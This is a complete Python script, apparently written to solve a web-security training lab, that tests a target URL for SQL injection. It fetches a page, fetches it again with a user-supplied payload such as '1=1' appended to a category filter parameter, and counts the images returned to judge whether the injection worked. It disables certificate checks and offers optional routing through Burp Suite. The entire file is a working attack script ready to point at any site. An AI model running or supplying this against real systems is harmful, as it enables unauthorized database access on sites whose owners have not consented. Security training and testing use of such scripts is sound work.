import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Uncomment the below line for enabling proxy through Burp Suite tool
# burp_proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url, uri, payload):

    # Uncomment the below line & comment the next line for enabling proxy through Burp Suite tool
    # before_injection = requests.get(url+uri, verify=False, proxies=burp_proxy)
    before_injection = requests.get(url+uri, verify=False)
    before_data = BeautifulSoup(before_injection.text, 'html.parser')
    before_images = before_data.find_all('img', src=True)
    print('Number of Images: ', len(before_images))
    for image in before_images:
        print(image)
    print()

    # Uncomment the below line & comment the next line for enabling proxy through Burp Suite tool
    #after_injection = requests.get(url+uri+payload, verify=False, proxies=burp_proxy)
    after_injection = requests.get(url+uri+payload, verify=False)
    after_data = BeautifulSoup(after_injection.text, 'html.parser')
    after_images = after_data.find_all('img', src=True)
    print('Number of Images: ', len(after_images))
    for image in after_images:
        print(image)
    print()

    if len(before_images) < len(after_images) and len(before_images) != len(after_images):
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
        payload = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage %s <url> <uri> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com /filter?category= "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, uri, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
